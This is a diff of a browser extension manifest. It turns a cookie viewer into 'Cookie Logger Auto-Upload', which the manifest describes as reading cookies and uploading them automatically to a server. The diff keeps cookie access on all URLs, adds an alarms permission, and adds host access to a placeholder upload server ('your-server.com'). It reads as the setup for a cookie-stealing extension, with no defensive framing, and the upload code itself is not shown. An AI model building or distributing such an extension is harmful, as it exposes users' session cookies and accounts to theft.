@@ -1,13 +1,15 @@
 {
   "manifest_version": 3,
-  "name": "Cookie Logger",
-  "version": "1.2",
-  "description": "Reads all accessible cookies and shows them in popup",
+  "name": "Cookie Logger Auto-Upload",
+  "version": "1.4",
+  "description": "Reads cookies and uploads them automatically to a server",
   "permissions": [
-    "cookies"
+    "cookies",
+    "alarms"
   ],
   "host_permissions": [
-    "<all_urls>"
+    "<all_urls>",
+    "http://your-server.com/*"
   ],
   "background": {
     "service_worker": "background.js",
